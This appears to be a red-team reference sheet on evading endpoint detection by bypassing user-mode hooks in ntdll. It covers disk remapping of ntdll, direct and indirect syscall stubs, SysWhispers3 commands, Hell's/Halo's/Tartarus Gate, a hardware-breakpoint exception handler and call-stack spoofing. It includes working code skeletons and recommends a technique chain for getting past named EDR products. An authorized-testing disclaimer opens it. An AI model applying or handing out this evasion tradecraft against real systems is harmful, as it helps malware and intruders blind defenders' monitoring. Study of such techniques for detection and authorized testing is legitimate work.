# Unhook / direct / indirect syscall technique list

> Authorized red team / adversary emulation / own-product tests only. Forbidden on unauthorized targets.

Mainstream "bypass user-mode hook" techniques, from classic unhook to hardware-breakpoint Blindside.
All mapped to MITRE ATT&CK T1562.001 / T1027 / T1055 for report output.

## 1. Peruns Fart / Fresh Ntdll from disk

### Idea

EDR hooks live entirely in **the in-process ntdll.dll**. Disk `C:\Windows\System32\ntdll.dll` is clean.
Remap disk ntdll into the current process and overwrite in-memory `.text`; hooks are gone.

```text
current-process ntdll.dll (RWX)
  ┌─────────────────────────┐
  │ .text (with EDR hook jmp) │ ◄── overwrite with clean disk .text
  └─────────────────────────┘
        ▲
        │ NtMapViewOfSection(disk_ntdll)
        │
  disk C:\Windows\System32\ntdll.dll  ← clean
```

### Implementation notes

```c
// steps:
// 1. CreateFileW("\\Device\\HarddiskVolumeX\\Windows\\System32\\ntdll.dll")  // native path to dodge monitors
// 2. NtCreateSection (SEC_IMAGE)
// 3. NtMapViewOfSection to a new address
// 4. find the new-address .text
// 5. NtProtectVirtualMemory current ntdll .text → RW
// 6. memcpy overwrite
// 7. NtProtectVirtualMemory restore RX
```

### Notes

- `NtProtectVirtualMemory` itself may be hooked → chain problem. Fix: call `NtProtectVirtualMemory` via **direct syscall** first
- Modern EDR already watches W ops of `NtProtectVirtualMemory` on ntdll; pair with ETW patch
- Peruns Fart under ETW-TI leaves `KERNEL_MODULE_LOAD`, `PROTECTVM` — MUST suppress ETW first

## 2. Direct syscall

### Idea

Do not call ntdll exports; write your own syscall stub:

```asm
NtAllocateVirtualMemory:
    mov r10, rcx
    mov eax, 0x18      ; SSN (Win11 24H2 value; differs per version)
    syscall
    ret
```

`syscall` jumps userland → kernel SSDT, skipping any user-mode hook.

### SysWhispers3

```powershell
git clone https://github.com/klezVirus/SysWhispers3
cd SysWhispers3
python3 syswhispers.py --preset all --action edit -o syscalls
```

Output:

```text
syscalls.h    - function decls
syscalls.c    - C glue
syscalls.asm  - MASM stubs
syscallsstubs.std.x64.asm  - standard direct syscall
```

In Visual Studio:

```text
1. Add .asm to the project, enable MASM (Custom Build Tool)
2. include syscalls.h
3. Call Sw3NtAllocateVirtualMemory(...) instead of NtAllocateVirtualMemory
```

### Minimal direct-syscall NtCreateFile (C skeleton)

```c
// syscalls.asm (excerpt)
// Sw3NtCreateFile PROC
//     mov [rsp +8], rcx
//     mov [rsp+16], rdx
//     mov [rsp+24], r8
//     mov [rsp+32], r9
//     sub rsp, 28h
//     mov ecx, 0x55           ; function hash (dynamic SSN resolve)
//     call Sw3GetSyscallNumber
//     add rsp, 28h
//     mov rcx, [rsp+8]
//     mov rdx, [rsp+16]
//     mov r8,  [rsp+24]
//     mov r9,  [rsp+32]
//     mov r10, rcx
//     syscall
//     ret
// Sw3NtCreateFile ENDP

#include <windows.h>
#include "syscalls.h"

int main(void) {
    HANDLE hFile = NULL;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING uName;
    IO_STATUS_BLOCK iosb;
    WCHAR path[] = L"\\??\\C:\\Windows\\Temp\\edr_test.bin";

    uName.Buffer = path;
    uName.Length = (USHORT)(wcslen(path) * sizeof(WCHAR));
    uName.MaximumLength = uName.Length + sizeof(WCHAR);

    InitializeObjectAttributes(&oa, &uName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS st = Sw3NtCreateFile(
        &hFile,
        FILE_GENERIC_WRITE,
        &oa,
        &iosb,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );

    if (st >= 0) {
        // write some bytes omitted
        Sw3NtClose(hFile);
        return 0;
    }
    return (int)st;
}
```

### Downside

- `syscall` lives in the implant's own `.text` (not ntdll) → kernel-mode telemetry easily sees "syscall from non-ntdll address"
- That is why indirect syscall exists

## 3. Indirect syscall

### Idea

The `syscall` insn still comes from ntdll.dll (legitimate address); we only control SSN and return address:

```text
implant code:
    mov r10, rcx
    mov eax, <SSN>
    jmp [<addr of some syscall;ret gadget in ntdll>]   ; syscall is not in implant
```

The gadget is usually the two-byte `syscall; ret` at the tail of an `Nt*` function.
Kernel-mode ETW provider sees RIP in ntdll — matches a legitimate behavior pattern.

### SysWhispers3 indirect mode

```powershell
python3 syswhispers.py --preset all --action edit --mode jumper -o syscalls
# --mode jumper            => indirect syscall
# --mode jumper_randomized => randomize jmp target to cut signatures
```

Generated stub:

```asm
Sw3NtAllocateVirtualMemory PROC
    mov [rsp+8], rcx
    ...
    mov ecx, 0x18                  ; function hash
    call Sw3GetSyscallNumber       ; SSN → eax
    call Sw3GetSyscallAddress      ; ntdll syscall;ret addr → rbx
    ...
    mov r10, rcx
    jmp rbx                        ; jump to legitimate syscall insn in ntdll
Sw3NtAllocateVirtualMemory ENDP
```

## 4. Hell's Gate / Halo's Gate / Tartarus Gate

Three stages of "dynamic SSN resolve".

### Hell's Gate

- Assumes ntdll is unhooked
- At implant start, walk ntdll `Nt*` exports; pull SSN from first 4 bytes `mov eax, <SSN>`
- Pro: no hardcoded SSN; works across Windows versions
- Con: if ntdll is already hooked (first byte is jmp), extract fails

### Halo's Gate

- Fixes Hell's Gate's hook problem
- If a function is hooked (not a standard prologue), **scan ±N neighboring functions**
- `Nt*` SSNs in ntdll increment continuously; reverse the hooked function's SSN from neighbors

```text
Normal:
  NtAllocateVirtualMemory  SSN = 0x18
  NtQueryInformationProcess SSN = 0x19
  NtProtectVirtualMemory    SSN = 0x50

If NtAllocateVirtualMemory is hooked and SSN is invisible, look at neighbors:
  previous unhooked export SSN = 0x17
  next unhooked export SSN = 0x19
  → NtAllocateVirtualMemory SSN = 0x18
```

### Tartarus Gate

- Further handles **advanced hooks that rewrite SSN but keep the syscall insn**
- Validates both SSN and syscall;ret gadget address
- Combined, the three give the most stable indirect-syscall base

### Reference impls (after bootstrap git clone)

```text
Hell's Gate:    am0nsec/HellsGate
Halo's Gate:    am0nsec/HellsGate (with fallback) / SafeBreach-Labs/HalosGate-PoC
Tartarus Gate:  trickster0/TartarusGate
SysWhispers3:   integrates all three
```

## 5. Hardware Breakpoint Blindside

### Idea

Use debug registers `DR0-DR3` to set a hardware breakpoint at the EDR hook-trampoline entry;
install a VEH (Vectored Exception Handler) that, on hit, **rewrites RIP past the trampoline**,
skipping EDR detect code and landing on ntdll's real syscall section.

### Strengths

- No write to ntdll memory (no `NtProtectVirtualMemory` alert)
- No unhook (hook stays; it is skipped)
- ETW-TI sees no memory modify

### Skeleton

```c
// 1. AddVectoredExceptionHandler
// 2. Set DR0..DR3 at each hooked-function entry (max 4; rotate with single-step)
// 3. SetThreadContext(thread, &ctx) write DRx
// 4. EDR hook trampoline hits HWBP → VEH takes over
// 5. VEH rewrites EXCEPTION_POINTERS->ContextRecord->Rip to ntdll's legit syscall;ret
// 6. ContinueExecution

LONG CALLBACK Blindside(EXCEPTION_POINTERS* ep) {
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        DWORD64 rip = ep->ContextRecord->Rip;
        if (rip == g_hookedNtAllocVM) {
            // SSN already in eax; R10 = RCX; jump to ntdll syscall;ret
            ep->ContextRecord->Rip = (DWORD64)g_syscallGadget;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
```

### Limits

- DRx is per-thread → set on each thread
- Some EDRs already hook `NtSetContextThread` / `NtGetContextThread`; bypass those first with earlier techniques
- Win11 22H2+ HVCI / some anti-debug mitigations may interfere

## 6. Call Stack Spoofing

### Problem

Modern EDR, at kernel entry of `NtAllocateVirtualMemory` / `NtCreateThreadEx` etc., calls `RtlCaptureStackBackTrace`
and reports the full stack. Implant stacks show **non-image-backed memory** frames → high-confidence alert.

### Scheme A: CallStackSpoofer (William Burgess)

Idea:

1. Before syscall, swap the current thread stack → a forged legitimate stack
2. Fill forged frames with a fully legit return chain such as `kernel32!BaseThreadInitThunk → ntdll!RtlUserThreadStart`
3. After syscall returns, swap the real stack back

### Scheme B: SilentMoonwalk

More aggressive; desynchronized stack:

```text
flow:
  implant code  →  custom trampoline (rewrite RSP / RBP / stack contents)
                ↓
                syscall (RtlCaptureStackBackTrace sees the forged stack)
                ↓
                trampoline restore → continue implant code
```

Key is unwinding: make `RtlVirtualUnwind` walk a forged `RUNTIME_FUNCTION` / `UNWIND_INFO` chain.

### Field OPSEC

- call-stack spoof + indirect syscall + ETW patch is a relatively stable combo past CrowdStrike / SentinelOne today
- Spoof during sleep too; spoofing only at execute time is not enough (EDR samples periodically)

## 7. Technique pick table

| Technique | Counters | Complexity | Current effectiveness | ATT&CK |
|-----------|----------|------------|-----------------------|--------|
| Peruns Fart | User-mode hook | Low | Medium (easy ETW catch) | T1562.001 |
| Direct syscall (SysWhispers) | User-mode hook | Low | Low-medium (kernel sees RIP in implant) | T1106 / T1562.001 |
| Indirect syscall (jumper) | User-mode hook + kernel RIP detect | Medium | Medium-high | T1106 |
| Hell's / Halo's / Tartarus | SSN resolve | Medium | High (infrastructure) | T1027 |
| HWBP Blindside | hook + no write | High | High | T1562.001 |
| CallStackSpoofer / SilentMoonwalk | call-stack telemetry | High | High | T1564 |

Field-recommended chain: **Halo's Gate + indirect syscall + CallStackSpoofer + ETW patch**.

## References

- SysWhispers3: <https://github.com/klezVirus/SysWhispers3>
- Hell's Gate / Halo's Gate POC: <https://github.com/am0nsec/HellsGate>, <https://github.com/SafeBreach-Labs/HalosGate-PoC>
- Tartarus Gate: <https://github.com/trickster0/TartarusGate>
- CallStackSpoofer: <https://github.com/WithSecureLabs/CallStackSpoofer>
- SilentMoonwalk: <https://github.com/klezVirus/SilentMoonwalk>
- Blindside (hardware breakpoint): <https://www.cyberark.com/resources/threat-research-blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints>
- MITRE T1562.001: <https://attack.mitre.org/techniques/T1562/001/>

## Routing callback

Unhook is half the bypass. The other half is telemetry blindness: go to `references/telemetry-blinding.md`.
